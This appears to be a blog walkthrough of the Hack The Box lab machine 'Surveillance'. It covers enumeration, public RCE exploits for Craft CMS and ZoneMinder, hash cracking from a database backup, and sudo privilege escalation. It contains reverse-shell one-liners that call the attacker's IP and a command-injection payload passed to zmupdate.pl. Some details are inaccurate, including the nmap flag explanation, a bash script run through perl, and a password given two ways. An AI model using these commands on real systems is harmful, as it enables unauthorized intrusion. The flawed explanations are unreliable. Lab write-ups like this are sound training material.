---
title: "Surveillance"
date: 2024-02-22
layout: "simple"
categories: [Hack The Box]
tags: [Privesc, Boot2root]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---
## Step by step methodology 
# Nmap scan 

First of all we can do some basic enumeration like checking for open ports and this is made possible by using a tool called nmap, which is used for network discovery and security auditing. We are also going to pass some options to the command let us break it down first: 

    -sVC: These are options passed to Nmap: 

    -s: This option specifies the type of scan to perform. In this case, -s indicates that a TCP SYN scan is being performed. This scan technique sends SYN packets to the target ports and analyzes the responses to determine which ports are open. 

    V: This option increases verbosity, providing more detailed information about the scan process and results. 

    C: This option enables version detection. When version detection is enabled, Nmap attempts to determine the versions of the services running on the open ports by analyzing their responses. 

    -T4: This option sets the timing template for the scan. Timing templates control the speed and aggressiveness of the scan. -T4 is a relatively aggressive timing template, indicating that the scan should be conducted at a fast pace, but not at the fastest possible speed (-T5). This helps to balance speed with reliability and accuracy. 

 
```shell
dexter@lab:~/lab/HTB/machines/surveilance$ sudo nmap -sVC -T4 10.10.11.245 -vv  

[sudo] password for dexter:  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 02:01 EST 

NSE: Loaded 156 scripts for scanning. 

NSE: Script Pre-scanning. 

NSE: Starting runlevel 1 (of 3) scan. 

Initiating NSE at 02:01 

Completed NSE at 02:01, 0.00s elapsed 

NSE: Starting runlevel 2 (of 3) scan. 

Initiating NSE at 02:01 

Completed NSE at 02:01, 0.00s elapsed 

NSE: Starting runlevel 3 (of 3) scan. 

Initiating NSE at 02:01 

Completed NSE at 02:01, 0.00s elapsed 

Initiating Ping Scan at 02:01 

Scanning 10.10.11.245 [4 ports] 

Completed Ping Scan at 02:01, 0.15s elapsed (1 total hosts) 

Initiating Parallel DNS resolution of 1 host. at 02:01 

Completed Parallel DNS resolution of 1 host. at 02:01, 0.17s elapsed 

Initiating SYN Stealth Scan at 02:01 

Scanning 10.10.11.245 [1000 ports] 

Discovered open port 80/tcp on 10.10.11.245 

Discovered open port 22/tcp on 10.10.11.245 

Increasing send delay for 10.10.11.245 from 0 to 5 due to 375 out of 937 dropped probes since last increase. 

Increasing send delay for 10.10.11.245 from 5 to 10 due to 11 out of 12 dropped probes since last increase. 

Completed SYN Stealth Scan at 02:01, 9.63s elapsed (1000 total ports) 

Initiating Service scan at 02:01 

Scanning 2 services on 10.10.11.245 

Completed Service scan at 02:01, 7.40s elapsed (2 services on 1 host) 

NSE: Script scanning 10.10.11.245. 

NSE: Starting runlevel 1 (of 3) scan. 

Initiating NSE at 02:01 

Completed NSE at 02:02, 6.45s elapsed 

NSE: Starting runlevel 2 (of 3) scan. 

Initiating NSE at 02:02 

Completed NSE at 02:02, 0.63s elapsed 

NSE: Starting runlevel 3 (of 3) scan. 

Initiating NSE at 02:02 

Completed NSE at 02:02, 0.01s elapsed 

Nmap scan report for 10.10.11.245 

Host is up, received echo-reply ttl 63 (0.15s latency). 

Scanned at 2024-02-22 02:01:41 EST for 24s 

Not shown: 998 closed tcp ports (reset) 

PORT   STATE SERVICE REASON         VERSION 

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 

| ssh-hostkey:  

|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) 

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk= 

|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi 

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu) 

|_http-server-header: nginx/1.18.0 (Ubuntu) 

|_http-title: Did not follow redirect to http://surveillance.htb/ 

| http-methods:  

|_  Supported Methods: GET HEAD POST OPTIONS 

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

  

NSE: Script Post-scanning. 

NSE: Starting runlevel 1 (of 3) scan. 

Initiating NSE at 02:02 

Completed NSE at 02:02, 0.00s elapsed 

NSE: Starting runlevel 2 (of 3) scan. 

Initiating NSE at 02:02 

Completed NSE at 02:02, 0.00s elapsed 

NSE: Starting runlevel 3 (of 3) scan. 

Initiating NSE at 02:02 

Completed NSE at 02:02, 0.01s elapsed 

Read data files from: /usr/bin/../share/nmap 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 

Nmap done: 1 IP address (1 host up) scanned in 25.56 seconds 

           Raw packets sent: 1643 (72.268KB) | Rcvd: 1023 (40.916KB) 
```
  

Running an Nmap scan I see that we have 2 ports open that is port 80 and port 22. Let us break that down: 

    Port 80: This is the default port for HTTP (Hypertext Transfer Protocol) traffic, which is used for serving web pages. If port 80 is open, it suggests that there is a web server running on your network that is accessible via the internet. Websites, web applications, and other web-based services typically use port 80 to communicate with clients. 

    Port 22: This is the default port for SSH (Secure Shell) traffic, which is used for secure remote access to a system. If port 22 is open, it indicates that there is a SSH server running on your network. SSH is commonly used by system administrators to remotely manage servers and devices securely over a network. 

 

Having both of these ports open can be typical for many servers or systems that require both web services and secure remote access. 

So next we can use a neat tool called whatweb, which is basically a web scanner tool used for identifying technologies used on websites. When you run WhatWeb on a target IP address or domain, it analyzes the web server's response and provides information about the technologies it detects, such as web frameworks, CMS (Content Management Systems), programming languages, and more. One can also opt to use wappalyzer which is a browser extension. 

```shell
dexter@lab:~/lab/HTB/machines/surveilance$ whatweb http://10.10.11.245/     

http://10.10.11.245/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], RedirectLocation[http://surveillance.htb/], Title[302 Found], nginx[1.18.0] 

``` 

So visiting the site I see a bunch of things like it is powered by craft CMS and we also have an email link . 

```demo@surveillance.htb``` 

Next step we can then try and check for hidden directories that may not be accessible through the normal browsing. Gobuster is a tool used for directory and file enumeration on web servers. It's particularly useful for discovering hidden or unlinked content that may not be easily accessible through normal browsing. 

When you run Gobuster against a target website or domain, it generates a list of potential directories and files by brute-forcing common directory and file names. It does this by sending HTTP requests to the web server and analyzing the server's responses to determine whether certain directories or files exist. 

Using 20 threads makes gobuster run a bit more faster.  
 
```shell
dexter@lab:~/lab/HTB/machines/surveilance$ gobuster dir -u http://surveillance.htb/ --wordlist /usr/share/dirb/wordlists/common.txt -t 20 

=============================================================== 

Gobuster v3.6 

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) 

=============================================================== 

[+] Url:                     http://surveillance.htb/ 

[+] Method:                  GET 

[+] Threads:                 20 

[+] Wordlist:                /usr/share/dirb/wordlists/common.txt 

[+] Negative Status codes:   404 

[+] User Agent:              gobuster/3.6 

[+] Timeout:                 10s 

=============================================================== 

Starting gobuster in directory enumeration mode 

=============================================================== 

/.htaccess            (Status: 200) [Size: 304] 

/admin                (Status: 302) [Size: 0] [--> http://surveillance.htb/admin/login] 

/css                  (Status: 301) [Size: 178] [--> http://surveillance.htb/css/] 

/fonts                (Status: 301) [Size: 178] [--> http://surveillance.htb/fonts/] 

/images               (Status: 301) [Size: 178] [--> http://surveillance.htb/images/] 

/img                  (Status: 301) [Size: 178] [--> http://surveillance.htb/img/] 

/index                (Status: 200) [Size: 1] 

/index.php            (Status: 200) [Size: 16230] 

/js                   (Status: 301) [Size: 178] [--> http://surveillance.htb/js/] 

/logout               (Status: 302) [Size: 0] [--> http://surveillance.htb/] 

/web.config           (Status: 200) [Size: 1202] 

/wp-admin             (Status: 418) [Size: 24409] 

Progress: 4614 / 4615 (99.98%) 

=============================================================== 

Finished 

=============================================================== 
```
We can read more on the status codes [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)

So for example the code 302, The HyperText Transfer Protocol (HTTP) 302 Found redirect status response code indicates that the resource requested has been temporarily moved to the URL given by the Location header. A browser redirects to this page but search engines don't update their links. 
![admin](https://i.ibb.co/DYx599B/admin-page.png)

Let us try a bunch of passwords. And they don't really work so time to go do some research that leads me here. So I tried playing around with burp suite and see what happens,  and it was not really that helpful since I couldn’t find anything, possibly a rabbit hole.
![burp](https://i.ibb.co/2tsfd8f/burp-creds.png)

So we can dig around articles such as: [here](https://nvd.nist.gov/vuln/detail/CVE-2022-37783) and [here](https://cves.at/posts/cve-2022-37783/writeup/)

```
 All Craft CMS versions between 3.0.0 and 3.7.32 disclose password hashes of users who authenticate using their E-Mail address or username in Anti-CSRF-Tokens. Craft CMS uses a cookie called CRAFT_CSRF_TOKEN and a HTML hidden field called CRAFT_CSRF_TOKEN to avoid Cross Site Request Forgery attacks. The CRAFT_CSRF_TOKEN cookie discloses the password hash in without encoding it whereas the corresponding HTML hidden field discloses the users' password hash in a masked manner, which can be decoded by using public functions of the YII framework. 
```
So we do see that some CMS versions are vulnerable to Cross site forgery request, so let us check our CMS version to see if this attack would be possible against our target. Going through index.php we find the version of the CMS. It is version 4.4.14 so we really cannot do a cross site forgery here. 
![cms_version](https://i.ibb.co/hZwbkXp/cms-version.png)

Digging deeper we can find another nice article that mentions a vulnerability discovered that allowed attackers to perform arbirtiary code remotely.  

[exploit](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)

CVE-2023-41892 is a security vulnerability discovered in Craft CMS, a popular content management system. Craft CMS versions affected by this vulnerability allow attackers to execute arbitrary code remotely, potentially compromising the security and integrity of the application. 

We are also given a python exploit and we can try that. So running the script with the URL gives us a shell. 
```shell
dexter@lab:~/lab/HTB/machines/surveilance$ python3 poc.py                                                                                        

Usage: python CVE-2023-41892.py <url> 

dexter@lab:~/lab/HTB/machines/surveilance$ python3 poc.py http://surveillance.htb/ 

[-] Get temporary folder and document root ... 

[-] Write payload to temporary file ... 

[-] Trigger imagick to write shell ... 

[-] Done, enjoy the shell 

$ id 

uid=33(www-data) gid=33(www-data) groups=33(www-data) 

$ whoami 

www-data 

$  
```

So now I figured we cannot really do anything here so we might need a stable shell, and that can be made possible by sending a reverse shell and firing up a listener to get back a connection. One could use this one liner. 

```bash 
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.35 9001 >/tmp/f 
```

We can then start up a listener on another terminal and get this  

```shell
dexter@lab:~/lab/HTB/machines/surveilance$ nc -lnvp 9001 

listening on [any] 9001 ... 

connect to [10.10.14.35] from (UNKNOWN) [10.10.11.245] 55234 

bash: cannot set terminal process group (1111): Inappropriate ioctl for device 

bash: no job control in this shell 

www-data@surveillance:~/html/craft/web/cpresources$  
```

In the home directory we can see we have two users, matthew and zoneminder but it seems we don't have permissions here. 

```shell
www-data@surveillance:/home$ ls -la    

ls -la 

total 16 

drwxr-xr-x  4 root       root       4096 Oct 17 11:20 . 

drwxr-xr-x 18 root       root       4096 Nov  9 13:19 .. 

drwxrwx---  3 matthew    matthew    4096 Nov  9 12:45 matthew 

drwxr-x---  2 zoneminder zoneminder 4096 Nov  9 12:46 zoneminder 
```

We can then go through the files in here and after some time we could come across this zip file, now the zip file is interesting since it could hold some information like credentials from the database. 

```shell
www-data@surveillance:~/html/craft/storage/backups$ ls 

ls 

surveillance--2023-10-17-202801--v4.4.14.sql.zip 
```

First, you need to transfer the file containing your zip file to a location that is accessible by the web server. This is typically the web server's root directory or a directory where files are served to clients. You can use various methods to transfer the file, such as uploading it via FTP, SCP (Secure Copy), or using a file manager if you have access to a web-based file management interface. Once the file is uploaded to the web server directory, it becomes accessible via HTTP. You can then use a tool like wget on the target system to download the zip file from the web server.  

```bash
cp /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip surveillance--2023-10-17-202801--v4.4.14.sql.zip  
```
 
```bash
dexter@lab:~/lab/HTB/machines/surveilance$ wget http://surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip  
```

We can unzip this zip file and we get a file. We can go through the file searching for something interesting like some usernames or passwords, and then we come across this: 
```bash
LOCK TABLES `users` WRITE; 

/*!40000 ALTER TABLE `users` DISABLE KEYS */; 

set autocommit=0; 

INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46'); 

/*!40000 ALTER TABLE `users` ENABLE KEYS */; 

UNLOCK TABLES; 

commit; 
```

Well, it looks like we might have found a hash right next to matthew and using hash-identifier we can see possible hashes. 
```shell
dexter@lab:~/lab/HTB/machines/surveilance$ hash-identifier 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec 

   ######################################################################### 

   #     __  __                     __           ______    _____           # 

   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         # 

   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        # 

   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       # 

   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      # 

   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      # 

   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 # 

   #                                                             By Zion3R # 

   #                                                    www.Blackploit.com # 

   #                                                   Root@Blackploit.com # 

   ######################################################################### 

-------------------------------------------------- 

  

Possible Hashs: 

[+] SHA-256 

[+] Haval-256 
```
  

We can then use hashcat to try and decode the hash or something 
```shell
- [ Hash modes ] - 

  

      # | Name                                                       | Category 

  ======+============================================================+====================================== 

    900 | MD4                                                        | Raw Hash 

      0 | MD5                                                        | Raw Hash 

    100 | SHA1                                                       | Raw Hash 

   1300 | SHA2-224                                                   | Raw Hash 

   1400 | SHA2-256                                                   | Raw Hash 

```

Hashcat may not work for some but we have another option called crackstation, which is super fast. Other tools like John the ripper can also be used. 


Now we have mathew's password so now we can ssh into the machine. 
```shell
dexter@lab:~/lab/HTB/machines/surveilance$ ssh matthew@10.10.11.245 

The authenticity of host '10.10.11.245 (10.10.11.245)' can't be established. 

ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE. 

This key is not known by any other names. 

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 

Warning: Permanently added '10.10.11.245' (ED25519) to the list of known hosts. 

matthew@10.10.11.245's password:  

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64) 

  

* Documentation:  https://help.ubuntu.com 

* Management:     https://landscape.canonical.com 

* Support:        https://ubuntu.com/advantage 

  

  System information as of Thu Feb 22 10:10:13 AM UTC 2024 

  

  System load:  0.0               Processes:             225 

  Usage of /:   83.9% of 5.91GB   Users logged in:       0 

  Memory usage: 12%               IPv4 address for eth0: 10.10.11.245 

  Swap usage:   0% 

  

  

Expanded Security Maintenance for Applications is not enabled. 

  

0 updates can be applied immediately. 

  

Enable ESM Apps to receive additional future security updates. 

See https://ubuntu.com/esm or run: sudo pro status 

  

  

The list of available updates is more than a week old. 

To check for new updates run: sudo apt update 

  

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40 

matthew@surveillance:~$  
```
 Checking whether a user can run any sudo commands involves inspecting the sudo configuration (sudoers file) and determining which privileges have been granted to the user. Well we can do this using sudo –l. But we immediately realize that the user matthew cannot run sudo on the machine. 

```shell
matthew@surveillance:~$ sudo -l  

[sudo] password for matthew:  

Sorry, user matthew may not run sudo on surveillance. 
```

So I opt to sending linpeas to the machine and let it enumerate further 

```shell
matthew@surveillance:~$ wget http://10.10.14.35:8090/linpeas.sh 

--2024-02-22 10:17:13--  http://10.10.14.35:8090/linpeas.sh 

Connecting to 10.10.14.35:8090... connected. 

HTTP request sent, awaiting response... 200 OK 

Length: 853290 (833K) [text/x-sh] 

Saving to: ‘linpeas.sh’ 

  

linpeas.sh                              100%[============================================================================>] 833.29K   848KB/s    in 1.0s     

  

2024-02-22 10:17:16 (848 KB/s) - ‘linpeas.sh’ saved [853290/853290] 

  

matthew@surveillance:~$ ls 

linpeas.sh  user.txt 

matthew@surveillance:~$ chmod +x linpeas.sh 
```  

![database_username_pass](https://i.ibb.co/PxBSdcK/db-passwords.png)
Here linpeas is able to find a database username and and a database password, that may be interesting. 

![zoneminder_pass](https://i.ibb.co/rs1Z3WB/zoneminder-password.png)
Here linpeas is able to find the password ‘ZoneMinderPassword2023’, this could be the database password, and could be worth noting that down. 
![zoneminder_config](https://i.ibb.co/0jByxY7/zoneminder-config.png)
Linpeas is also able to find some configuration files of the database, we see that it is hosted locally (127.0.0.1) and is on port 8080.  We can then do a google search just to see what zonmidner is. https://zoneminder.com/. We find out that zoneminder is a monitoring software.  

Since we have access to a system within the local network, we can potentially use it as a pivot point for port forwarding, also known as port tunneling or SSH tunneling, to access services that are not directly accessible from outside the network. 

Here's how port forwarding works: 

    Set up an SSH Connection: First, you need to establish an SSH connection to a system within the local network that has access to the service you want to reach.  

    Configure Port Forwarding: While setting up the SSH connection, you can configure port forwarding by specifying the -L option followed by the local port, the destination address (usually localhost), and the destination port. For example, to forward local port 8080 to port 80 on a web server within the local network: 

    Access the Service: Once the SSH connection is established with port forwarding configured, you can access the service by connecting to localhost on the specified local port. For example, to access the web server, you would navigate to http://localhost:8080 in your web browser. 

Port forwarding allows you to securely access services within the local network without directly exposing them to the internet. It can be particularly useful for accessing services on systems behind firewalls or NAT (Network Address Translation) devices. 
```shell
dexter@lab:~/lab/HTB/machines/surveilance$ ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb 

The authenticity of host 'surveillance.htb (10.10.11.245)' can't be established. 

ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE. 

This host key is known by the following other names/addresses: 

    ~/.ssh/known_hosts:15: [hashed name] 

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 

Warning: Permanently added 'surveillance.htb' (ED25519) to the list of known hosts. 

matthew@surveillance.htb's password:  

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64) 

  

* Documentation:  https://help.ubuntu.com 

* Management:     https://landscape.canonical.com 

* Support:        https://ubuntu.com/advantage 

  

  System information as of Thu Feb 22 10:28:17 AM UTC 2024 

  

  System load:  0.0               Processes:             229 

  Usage of /:   84.5% of 5.91GB   Users logged in:       0 

  Memory usage: 19%               IPv4 address for eth0: 10.10.11.245 

  Swap usage:   0% 

  

  

Expanded Security Maintenance for Applications is not enabled. 

  

0 updates can be applied immediately. 

  

Enable ESM Apps to receive additional future security updates. 

See https://ubuntu.com/esm or run: sudo pro status 

  

  

The list of available updates is more than a week old. 

To check for new updates run: sudo apt update 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 

  

  

Last login: Thu Feb 22 10:10:14 2024 from 10.10.14.35 

matthew@surveillance:~$ ls 
```

Now we can try to access the site we get a login page there 
![zoneminder_login](https://i.ibb.co/z2nyRbn/zoneminder-login-page.png)
 
We can also check the config files. Configuration files often contain valuable information about the system setup and can sometimes reveal clues or misconfigurations that could lead to vulnerabilities or alternative access methods. Common locations for configuration files include /etc and directories within the application's installation directory. Look for files like config.php, config.ini, or similar, depending on the application.
![zoneminder_config](https://i.ibb.co/zb7pZcr/zoneminder-version.png)

We might do a google search on reported vulnerabilities concerning zoneminder and we do come across a GitHub repository that contains an exploit for a vulnerability identified as CVE-2023-26035, which enables remote code execution (RCE). Remote code execution vulnerabilities are severe security issues that allow an attacker to execute arbitrary code on a target system remotely, often leading to complete compromise of the system. 

[exploit](https://github.com/rvizx/CVE-2023-26035)
```shell
dexter@lab:~/lab/HTB/machines/surveilance/CVE-2023-26035$ python3 exploit.py -t http://127.0.0.1:2222 -ip 10.10.14.35 -p 4444 

[>] fetching csrt token 

[>] recieved the token: key:845fd9dea6ae5ab19dc10adb01f9fb99b27e321c,1708598433 

[>] executing... 

[>] sending payload.. 
```
```shell
dexter@lab:~/lab/HTB/machines/surveilance/CVE-2023-26035$ nc -lnvp 4444    

listening on [any] 4444 ... 

connect to [10.10.14.35] from (UNKNOWN) [10.10.11.245] 40688 

bash: cannot set terminal process group (1111): Inappropriate ioctl for device 

bash: no job control in this shell 

zoneminder@surveillance:/usr/share/zoneminder/www$  
```

We can get into the machine and now we can try and see what zoneminder can do, for example what zoneminder can run as sudo, since we remember matthew could not run any commands as sudo. 

```shell
zoneminder@surveillance:~$ sudo -l  

sudo -l  

Matching Defaults entries for zoneminder on surveillance: 

    env_reset, mail_badpass, 

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 

    use_pty 

  

User zoneminder may run the following commands on surveillance: 

    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl * 
```

The sudoers entry allows the zoneminder user to run any file in the /usr/bin directory that starts with zm, proceeded by only uppercase or lowercase letters and ends in a .pl extension. The second wild card allows anything to be run after it. 
![vuln](https://i.ibb.co/wSfrLPZ/some-png.webp)
The vulnerability appears to stem from improper input validation or insecure handling of user-supplied input in the zmupdate.pl script. By providing a file directory instead of a valid user parameter, we may be able to inject arbitrary commands into the script's execution flow. 

We can craft a malicious request to the zmupdate.pl script, supplying a file directory as the user parameter. Along with this, attach the password obtained earlier to authenticate the request, making it appear legitimate. As part of the exploit payload, then we may choose to create a reverse shell script and place it in a writable directory, such as /tmp. A reverse shell script allows us to establish a connection from the compromised system back to our machine, effectively providing remote access to the compromised system's command line. 

We then can send the crafted request to the vulnerable zmupdate.pl script, triggering the execution of arbitrary commands, including the creation and execution of the reverse shell script. Once the reverse shell is established, we gain remote access to the compromised system's command line. 

With a reverse shell established, we can interact with the compromised system, execute additional commands, escalate privileges, exfiltrate data, or perform further malicious activities as desired. 
```bash
#!/bin/bash 

busybox nc 10.10.14.35 1234 -e sh 
```

So we need to send the reverse shell onto the target machine and then try and run the zmupdate.pl using a one liner. We are also gonna add the password we found using linpeas earlier. 
```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(perl /tmp/revshell.pl)' --pass=ZoneMinderPassword 
```

BusyBox's version of Netcat is often used in scenarios where resources are limited, and a full-featured Netcat installation may not be feasible or necessary. 
![updating](https://i.ibb.co/2hKRKNb/updating-zoneminder.png)

and we are root. 

![root](https://i.ibb.co/QPG5495/root.png)
